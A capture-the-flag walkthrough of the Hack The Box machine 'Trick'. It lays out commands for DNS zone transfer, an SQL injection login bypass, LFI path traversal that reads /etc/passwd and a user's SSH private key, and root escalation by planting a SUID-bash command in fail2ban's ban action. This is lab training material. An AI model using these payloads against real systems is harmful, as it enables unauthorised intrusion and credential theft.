**Target:  10.10.11.166    trick.htb**

**Initial Access:**\
nmap -Pn 10.10.11.166 -p- --min-rate=5000|grep open|awk -F '/' '{print $1}'|tr '\n' ','\
output return showed open ports: 22,25,53,80

Enumerating these ports further with nmap:\
nmap -Pn 10.10.11.166 --min-rate=5000  -p 22,25,53,80 -sC -sV -oN nmap.trick

![image](https://user-images.githubusercontent.com/93153300/197863434-3a453cf2-a744-4f75-b9c9-91e36a5fea23.png)
 
Enumerating port 53 with dig:\
First, put into file /etc/hosts: 10.10.11.166  trick.htb\
Next run command: dig any trick.htb  10.10.11.166\
Found a new domain: root.trick.htb.	\
Add this into /etc/hosts: 10.10.11.166  root.trick.htb\
However, navigating to that page doesn’t show anything of interest.

Next, try a domain transfer: \
dig axfr trick.htb @10.10.11.166\
Output shows a new domain:  preprod-payroll.trick.htb\
Add this to /etc/hosts:   10.10.11.166  preprod-payroll.trick.htb

Navigate to http://preprod-payroll.trick.htb		\
Automatically get redirected to a login page: http://preprod-payroll.trick.htb/login.php\
Bypass the login by entering a sql injection in the username password field:  ‘ or 1=1--

It works, and we get logged in as Administrator, and redirected to:\ http://preprod-payroll.trick.htb/index.php?page=home\
However, navigating this page leads to nothing of interest.  

Looking at the domain preprod-payroll.trick.htb , let’s fuzz and see if we can find other subdomains.  Since payroll is a description of a certain field maybe other fields will show a hidden subdomain. To fuzz the payroll field run:  \
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host:preprod-FUZZ.trick.htb" -u "http://trick.htb" --hh 5480  
Found a new subdomain:   preprod-marketing.trick.htb\
Add this to /etc/hosts: 10.10.11.166   preprod-marketing.trick.htb\
Navigate to that site shows:

![image](https://user-images.githubusercontent.com/93153300/197863486-276a86d0-fc8a-492e-8768-48ce0e3c23a9.png)

Clicking on the top of the page on services, about, or contact directs to:\
http://preprod-marketing.trick.htb/index.php?page=services.html

The parameter ?page= could be vulnerable to lfi so I’ll fuzz for lfi:\
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://preprod-marketing.trick.htb/index.php?page=FUZZ" --hh 0

Output reveals it is vulnerable to lfi:   \
http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd

![image](https://user-images.githubusercontent.com/93153300/197863529-d5d79994-c85d-4896-bb08-7017b9766c91.png)

This reveals a user on the target named michael.   Upon checking, we find user Michael has a private ssh key: http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa	

![image](https://user-images.githubusercontent.com/93153300/197863588-acf15dbd-9f73-42e1-adab-d813facabd03.png)
 

Copy the key and create a file with the private key.  Next, change permissions to the file so it doesn’t error when trying to use it to log in with ssh: chmod 600 id_rsatarget.\
Finally, using ssh log into user michael with his private key:\
ssh -i id_rsatarget michael@10.10.11.166\
We have shell as michael, open /home/michael/user.txt to get the flag.
____________________________________________________________________________
**Privilege Escalation:**
Running command: sudo -l\
Output shows: 

![image](https://user-images.githubusercontent.com/93153300/197863644-6cf09356-ccea-4018-a6c8-34ee9f08a4a2.png)
Google search: fail2ban privilege escalation   → Plenty of articles showing this privilege escalation
Fail2ban is an application run by root that will ban your ip from ssh login if you enter too many incorrect passwords within a certain time limit.  If you can edit fail2ban file  /etc/fail2ban/action.d/iptables-multiport.conf then you can insert any command, and then cause fail2ban to run due to entering too many incorrect passwords in the specified time frame.  
It is important to note that in order for fail2ban to apply the changes you make you must be able to restart fail2ban.   Let’s check the 2 steps needed to be able to use this exploit.

Step 1: Check if we have permission to restart fail2ban:\
Sudo -l command above, showed that we have permission to restart fail2ban.  

Step 2: Check if we can edit the file:\
Checking /etc/fail2ban/action.d/iptables-multiport.conf permissions: 	\
ls -al  /etc/fail2ban/action.d/iptables-multiport.conf	 

![image](https://user-images.githubusercontent.com/93153300/197863697-088b2205-6250-4702-9dba-0d37efba2c3a.png)
 
Output shows that user michael, cannot write to this file, However, ls -al does show that the group security has full permissions in this folder.  \
Run command ‘id’ to check what groups user michael is part of.   Output on command id confirms that Michael is part of the security group, so we can edit this file. 

Seeing that we have permissions to perform both steps let’s use this to escalate to root.\
First, open file iptables-multiport.conf: vi iptables-multiport.conf\
Then, under ‘actionban’, add command: chmod 4755 /bin/bash

![image](https://user-images.githubusercontent.com/93153300/197863738-15074845-4878-4b96-813a-47080289f64a.png)
 

Next, update fail2ban by restarting it:\
sudo /etc/init.d/fail2ban restart

Finally, log into ssh and enter the incorrect password many times.  To be sure to pass the permitted limit of incorrect passwords in time we will use a basic bash script and run it from our terminal:  \
while true;  do sshpass -p password ssh michael@10.10.11.166; done

ls -al confirms /bin/bash permissions have changed to have suid permissions.

![image](https://user-images.githubusercontent.com/93153300/197863764-f444322a-4d1e-4270-898a-f98bcf1cf909.png)
 
To escalate to root:\
/bin/bash -p 

We are now root, open /root/root.txt  to get the flag.
